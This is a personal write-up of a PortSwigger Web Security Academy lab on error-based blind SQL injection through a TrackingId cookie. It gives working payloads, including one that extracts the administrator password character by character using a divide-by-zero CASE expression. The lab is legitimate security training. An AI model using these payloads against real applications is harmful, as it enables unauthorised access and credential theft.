# Lab 10 — Blind SQL Injection with Conditional Errors

**Difficulty:** Practitioner  
**Category:** Blind SQL Injection  
**Platform:** PortSwigger Web Security Academy

---

## What the lab is

Similar to the previous lab but with no "Welcome Back" message — the app gives identical responses regardless of whether the condition is true or false. Instead, we force the database to throw an error on true conditions and use that as our signal.

---

## The vulnerability

The TrackingId cookie is injectable. The app handles errors differently from normal responses — a 500 error vs a 200. We can use this to infer true/false.

---

## What I did

Used a CASE expression that triggers a divide-by-zero error when the condition is true:

```
TrackingId=xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--
```

- Condition true → `1/0` → DB error → 500 response
- Condition false → `'a'` → no error → 200 response

**Extracting the password:**

```
TrackingId=xyz' AND (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN 1/0 ELSE 'a' END FROM users)='a'--
```

500 = correct character, 200 = wrong character. Cycled through all positions and characters to build the full password.

---

## Key takeaway

When there's no visible difference in the response content, look for differences in HTTP status codes. A 500 error is just as useful a signal as a "Welcome Back" message — it's still a binary true/false channel. The key insight is that you're not trying to see data, just get a yes/no answer.
